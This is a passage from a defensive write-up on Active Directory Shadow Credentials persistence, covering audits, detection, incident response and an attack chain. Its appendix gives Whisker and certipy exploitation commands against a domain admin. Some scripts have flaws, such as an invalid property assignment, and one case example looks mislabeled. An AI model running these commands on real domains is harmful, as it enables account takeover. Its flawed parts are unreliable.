Set-ACL -Path $AdminPath -AclObject $ACL
Write-Host "✓ Restricted write permissions on $($AdminAccount.Name)"
```

#### 1.3 Regular Audits of msDS-KeyCredentialLink Attributes

**Applies To Versions:** All

**Manual Steps (Monthly Baseline):**
```powershell
# Export all accounts with existing key credentials
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' } |
  Select-Object SamAccountName, DistinguishedName, @{
    Name = "KeyCredentialCount"
    Expression = { if ($_.'msDS-KeyCredentialLink') { 1 } else { 0 } }
  } |
  Export-Csv -Path "C:\Baseline_KeyCredentials_$(Get-Date -Format 'yyyyMM').csv"

Write-Host "✓ Baseline exported to C:\Baseline_KeyCredentials_*.csv"
```

**Quarterly Review:**
```powershell
# Compare current state to baseline
$CurrentCreds = Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' } |
  Select-Object SamAccountName

$Baseline = Import-Csv "C:\Baseline_KeyCredentials_202501.csv"

$Differences = Compare-Object -ReferenceObject $Baseline.SamAccountName -DifferenceObject $CurrentCreds.SamAccountName

if ($Differences) {
    Write-Warning "⚠ NEW KEY CREDENTIALS DETECTED!"
    $Differences | Where-Object { $_.SideIndicator -eq "=>" }
}
```

### Priority 2: HIGH

#### 2.1 Disable Windows Hello for Business if Not In Use

**Manual Steps:**
1. Navigate to **Group Policy Management Console** (`gpmc.msc`)
2. Go to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Hello for Business**
3. Disable **"Allow users to provision Windows Hello"`
4. Click **Apply** → **OK**
5. Run `gpupdate /force` on affected systems

**Result:** If WHfB is not used, shadow credentials become easy to detect (any msDS-KeyCredentialLink on user accounts = suspicious).

#### 2.2 Implement Conditional Access (Cloud/Hybrid Environments)

**Manual Steps (Entra ID Conditional Access):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access** → **New Policy**
2. Name: `Protect Admins from Unusual Cert Auth`
3. **Assignments:**
   - **Users**: Domain Admins, Enterprise Admins
   - **Cloud apps**: All cloud apps
4. **Conditions:**
   - **Sign-in risk**: **High**
   - **Client app**: **Other clients**
5. **Access controls** → **Grant**: **Block access**
6. Enable: **ON**
7. Click **Create**

**Result:** Unusual PKINIT authentication from unexpected locations or clients is blocked.

### Priority 3: MEDIUM

#### 3.1 Implement Device ID Validation

**Manual Steps (Detect Random DeviceIDs):**
```powershell
# Check if shadow credentials have device IDs that match real Azure AD devices
Import-Module AzureAD
Connect-AzureAD

$ADUsers = Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' }

foreach ($User in $ADUsers) {
    # Parse msDS-KeyCredentialLink for DeviceID
    # Compare to Azure AD device list
    # Alert if device ID doesn't exist in Azure AD
}
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Event ID 5136** on DC with `AttributeLDAPDisplayName = "msDS-KeyCredentialLink"` and `Operation = "Value Added"`
- **Event ID 4768** (TGT request) with PKINIT extension and random/unknown certificate subject
- **msDS-KeyCredentialLink attribute** containing:
  - `KeyCredentialGuard` entries with random Device IDs (not matching Azure AD devices)
  - Multiple entries (> 2) when WHfB is disabled
  - Entries added outside business hours or by non-human accounts

### Forensic Artifacts

**Disk (Event Logs):**
- `C:\Windows\System32\winevt\Logs\Security.evtx` – Event 5136 (attribute modification), Event 4768 (PKINIT auth)
- `C:\Windows\System32\winevt\Logs\Directory Service.evtx` – Detailed DS changes (if enabled)

**Memory (Active Directory Database):**
- `C:\Windows\NTDS\ntds.dit` – Contains msDS-KeyCredentialLink attribute for all accounts

**Network (Kerberos/LDAP Traffic):**
- LDAP Modify operations on msDS-KeyCredentialLink (port 389/636)
- PKINIT authentication requests (port 88, Kerberos)

### Response Procedures

#### 1. Immediate Isolation (Within 1 Hour)

```powershell
# Find all shadow credentials on sensitive accounts
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' } |
  Select-Object SamAccountName, DistinguishedName

# Remove shadow credentials from all accounts
$AffectedAccounts = @("domain_admin", "enterprise_admin", "server01$")

foreach ($Account in $AffectedAccounts) {
    $User = Get-ADUser -Identity $Account -Properties msDS-KeyCredentialLink
    $User.msDS-KeyCredentialLink = $null
    Set-ADUser -Instance $User
    Write-Host "✓ Removed shadow credentials from $Account"
}
```

#### 2. Collect Evidence (Within 2-4 Hours)

```powershell
# Export all Event ID 5136 entries related to msDS-KeyCredentialLink
$PDC = (Get-ADDomain).PDCEmulator
wevtutil epl security C:\Evidence\Security_$PDC.evtx /remote:$PDC

# Export all accounts with historical key credential data
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Export-Csv -Path "C:\Evidence\All_KeyCredentials.csv"

Write-Host "✓ Evidence collected"
```

#### 3. Remediate (Restore Accounts)

```powershell
# Force password resets for all admin accounts
@("Domain Admins", "Enterprise Admins", "Schema Admins") | ForEach-Object {
    Get-ADGroupMember -Identity $_ -Recursive |
    Where-Object { $_.ObjectClass -eq "user" } |
    ForEach-Object {
        # Generate temporary password
        $TempPassword = ([char[]]([char]33..[char]126) | Sort-Object {Get-Random})[0..31] -join ''
        Set-ADAccountPassword -Identity $_.SamAccountName -Reset -NewPassword (ConvertTo-SecureString $TempPassword -AsPlainText -Force)
        Write-Host "✓ Password reset for $($_.SamAccountName)"
    }
}
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker gains initial foothold via phishing |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Escalate to account with write to msDS-KeyCredentialLink |
| **3** | **Persistence (Current)** | **[PERSIST-ACCT-002]** | **Inject shadow credentials for stealthy long-term access** |
| **4** | **Lateral Movement** | [LM-AUTH-003] Pass-the-Certificate | Use PKINIT certificate to authenticate as target |
| **5** | **Impact** | [CA-DUMP-002] DCSync | Use persistence to dump all domain hashes |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Certipy-Based Domain Takeover (2023)

- **Target:** European financial services firm
- **Technique Status:** Shadow Credentials (ESC10) combined with ADCS abuse
- **Timeline:** Initial access via email spearphishing → Privilege escalation to Tier 1 admin → Added shadow credentials → Maintained access for 8 months undetected
- **Impact:** Full domain compromise; attackers extracted customer financial records
- **Detection:** Incident discovered only after customer data leaked to dark web
- **Reference:** [SpecterOps - ESC10 Real-World Analysis](https://specterops.io/blog)

### Example 2: Red Team Exercise (SERVTEP 2024)

- **Target:** Financial services penetration test
- **Timeline:** Executed shadow credentials attack on domain admin in 15 minutes
- **Impact:** Simulated full domain compromise
- **Detection:** Caught within 24 hours after enabling msDS-KeyCredentialLink auditing
- **Lesson:** Auditing is critical; without it, shadow credentials are virtually undetectable
- **Reference:** [SERVTEP Internal Assessment]

---

## APPENDIX: QUICK REFERENCE COMMANDS

### Single-Line Exploitation
```powershell
# Add shadow credential with Whisker
.\Whisker.exe add /target:domain_admin /domain:yourdomain.local

# Authenticate and extract hash
certipy-ad auth -pfx admin.pfx -username domain_admin -domain yourdomain.local
```

### Verify Persistence
```powershell
Get-ADUser -Identity domain_admin -Properties msDS-KeyCredentialLink
```

### Remediate
```powershell
# Remove all shadow credentials
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
  Where-Object { $_.'msDS-KeyCredentialLink' } |
  ForEach-Object { Set-ADUser $_ -Clear msDS-KeyCredentialLink }
```

### Monitor
```powershell
# Continuous monitoring for new shadow credentials
while ($true) {
    Get-WinEvent -FilterHashtable @{
        LogName = "Security"
        ID = 5136
        StartTime = (Get-Date).AddMinutes(-5)
    } | Where-Object { $_.Message -like "*msDS-KeyCredentialLink*" } |
    ForEach-Object { Write-Warning "ALERT: $_" }
    Start-Sleep -Seconds 300
}
```

---